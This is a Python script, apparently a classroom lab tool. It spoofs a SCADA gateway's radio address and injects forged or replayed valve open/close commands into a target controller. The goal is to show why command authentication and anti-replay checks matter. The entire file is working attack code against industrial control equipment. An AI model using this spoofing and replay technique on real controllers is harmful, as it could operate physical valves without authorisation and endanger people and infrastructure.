#!/usr/bin/env python3
"""Inject a forged valve command into a controller to teach authentication.

Spoof.py is the classroom data-injection demonstration. It claims the
SCADA gateway address on the physical transceiver and transmits a crafted
valve command to the victim controller. Against the naive controller the
forged command moved the valve; against the hardened controller the same
attack fails twice over. The envelope cannot be authenticated because the
spoofing tool holds no field key, and even a captured command that did
authenticate would be rejected by the monotonic anti-replay window.
"""

import argparse
import secrets
import sys
import time

import field_crypto

try:
    import serial
except ImportError as exc:
    raise SystemExit(
        "pip install pyserial to run the VALVE spoof tool"
    ) from exc

HUB_ADDRESS = "0001"
NONCE_LEN = 24
TAG_LEN = 16
KEY_LEN = 32
VALVE_COMMAND_CLOSE = 0
VALVE_COMMAND_OPEN = 1
COMMANDS = {"open": VALVE_COMMAND_OPEN, "close": VALVE_COMMAND_CLOSE}


def _parse_args():
    """Parse spoof tool command-line arguments.

    Parameters
    ----------
    None

    Returns
    -------
    argparse.Namespace
        Parsed spoof tool arguments.
    """
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", required=True, help="Serial port device")
    parser.add_argument("--baud", type=int, default=115200,
                        help="Radio baud rate")
    _add_forge_args(parser)
    return parser.parse_args()


def _add_forge_args(parser):
    """Add the forged command and attack-mode options.

    Parameters
    ----------
    parser : argparse.ArgumentParser
        Parser receiving the forged field options.

    Returns
    -------
    None
    """
    parser.add_argument("--victim", required=True,
                        help="Victim controller address in hex")
    parser.add_argument("--seq", type=int, default=1,
                        help="Forged command sequence number")
    parser.add_argument("--cmd", choices=("open", "close"), default="open",
                        help="Forged valve command")
    parser.add_argument("--mode", choices=("bad-tag", "replay"),
                        default="bad-tag",
                        help="Forged sealed command or captured replay")
    parser.add_argument("--capture",
                        help="Captured hex command to replay in replay mode")


def _le32(value):
    """Encode an integer as four little-endian bytes.

    Parameters
    ----------
    value : int
        Unsigned value to encode.

    Returns
    -------
    bytes
        Four little-endian bytes.
    """
    return value.to_bytes(4, "little")


def _command_body(seq, cmd):
    """Build a forged command body of sequence, command, and random tag.

    Parameters
    ----------
    seq : int
        Forged command sequence number.
    cmd : int
        Forged valve command byte.

    Returns
    -------
    bytes
        Twenty-one byte forged command body.
    """
    return _le32(seq) + bytes([cmd]) + secrets.token_bytes(TAG_LEN)


def _forged_envelope(body):
    """Wrap a forged body in a plausible but unauthenticated envelope.

    Parameters
    ----------
    body : bytes
        Forged command body.

    Returns
    -------
    str
        Lowercase hex nonce, ciphertext, and random tag bytes.
    """
    key = secrets.token_bytes(KEY_LEN)
    nonce = secrets.token_bytes(NONCE_LEN)
    ct, tag = field_crypto._xchacha_seal(key, nonce, field_crypto.FIELD_AD,
                                         body)
    return (nonce + ct + tag).hex()


def _set_spoof_address(ser, address):
    """Claim an address on the local transceiver.

    Parameters
    ----------
    ser : serial.Serial
        Open radio serial connection.
    address : str
        Address to claim in hex.

    Returns
    -------
    None
    """
    cmd = f"AT+ADDRESS={int(address, 16)}\r\n".encode("utf-8")
    ser.write(cmd)
    ser.flush()


def _send_spoof(ser, victim, payload):
    """Transmit the forged command to the victim controller.

    Parameters
    ----------
    ser : serial.Serial
        Open radio serial connection.
    victim : str
        Victim controller address in hex.
    payload : str
        Forged frame text, either a broken envelope or a replay.

    Returns
    -------
    None
    """
    cmd = f"AT+SEND={victim},{len(payload)},{payload}\r\n"
    ser.write(cmd.encode("utf-8"))
    ser.flush()


def _frame(args):
    """Build the forged wire frame for the selected attack mode.

    Parameters
    ----------
    args : argparse.Namespace
        Parsed spoof tool arguments.

    Returns
    -------
    str
        Forged frame text sent to the victim controller.
    """
    if args.mode == "replay":
        return args.capture or ""
    return _forged_envelope(_command_body(args.seq, COMMANDS[args.cmd]))


def main():
    """Inject the forged valve command under the gateway address.

    Parameters
    ----------
    None

    Returns
    -------
    int
        Zero on successful injection.
    """
    args = _parse_args()
    frame = _frame(args)
    with serial.Serial(args.port, args.baud, timeout=1.0) as ser:
        _set_spoof_address(ser, HUB_ADDRESS)
        time.sleep(0.2)
        _send_spoof(ser, args.victim, frame)
    print(f"Injected forged {args.mode} {args.cmd} command to controller "
          f"0x{args.victim}")
    print("The controller rejects it because the spoof tool holds no field "
          "key and cannot seal a valid envelope.")
    print("A captured command that did authenticate is still refused by the "
          "monotonic anti-replay window.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
